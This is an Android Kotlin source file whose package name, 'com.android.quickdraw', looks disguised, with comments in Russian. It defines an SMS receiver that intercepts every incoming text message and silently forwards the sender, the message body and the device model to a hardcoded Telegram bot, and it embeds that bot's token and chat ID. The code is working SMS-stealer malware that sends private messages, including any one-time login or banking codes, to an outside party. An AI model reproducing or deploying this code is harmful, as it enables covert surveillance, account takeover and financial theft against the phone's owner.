package com.android.quickdraw

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Telephony
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class SmsReceiver : BroadcastReceiver() {
    private val client = OkHttpClient()

    override fun onReceive(context: Context, intent: Intent) {
        when (intent.action) {
            Telephony.Sms.Intents.SMS_DELIVER_ACTION, // Для входящих SMS
            "android.provider.Telephony.SMS_RECEIVED" -> { // Альтернативное действие
                handleSms(intent)
            }
        }
    }

    private fun handleSms(intent: Intent) {
        // Способ 1 (предпочтительный для новых версий Android)
        val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        smsMessages?.forEach { sms ->
            sendSmsToBot(
                sender = sms.originatingAddress ?: "Unknown",
                message = sms.messageBody ?: "Empty message"
            )
        }

        // Способ 2 (для обратной совместимости)
        val bundle: Bundle? = intent.extras
        if (bundle != null) {
            val pdus: Array<Any?>? = bundle.get("pdus") as Array<Any?>?
            pdus?.forEach { pdu ->
                val smsMessage = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray)
                sendSmsToBot(
                    sender = smsMessage.originatingAddress ?: "Unknown",
                    message = smsMessage.messageBody ?: "Empty message"
                )
            }
        }
    }

    private fun sendSmsToBot(sender: String, message: String) {
        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val deviceModel = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

        val text = """
            Новое SMS сообщение
            Отправитель: $sender
            Сообщение: $message
            $deviceModel
        """.trimIndent()

        val mediaType = "application/json".toMediaType()
        val requestBody = """
            {
                "chat_id": "$chatId",
                "text": "$text",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                response.close()
            }
        })
    }
}
